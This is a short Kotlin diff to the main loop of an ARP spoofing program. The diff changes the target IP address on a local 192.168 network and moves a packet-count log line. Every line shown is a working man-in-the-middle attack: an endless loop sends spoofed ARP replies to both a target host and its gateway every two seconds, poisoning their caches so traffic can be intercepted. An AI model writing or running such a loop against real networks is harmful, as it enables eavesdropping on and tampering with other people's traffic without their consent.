@@ -11,17 +11,17 @@ object Main {
     fun main(args: Array<String>) {
         val nif = NifSelector().selectNetworkInterface()
         val arpSpoof = ArpSpoof(nif)
-        val targetIP = "192.168.18.147"
+        val targetIP = "192.168.18.216"
         val gatewayIP = "192.168.18.1"
         val target = ArpSpoof.Target(targetIP.toInetAddress())
         val gateway = ArpSpoof.Target(gatewayIP.toInetAddress())
         var count = 1
 
         while (true) {
-            logger.info("sent $count packets")
             arpSpoof.spoof(target, gateway)
             arpSpoof.spoof(gateway, target)
             count += 2
+            logger.info("sent $count packets")
             Thread.sleep(2000)
         }
     }
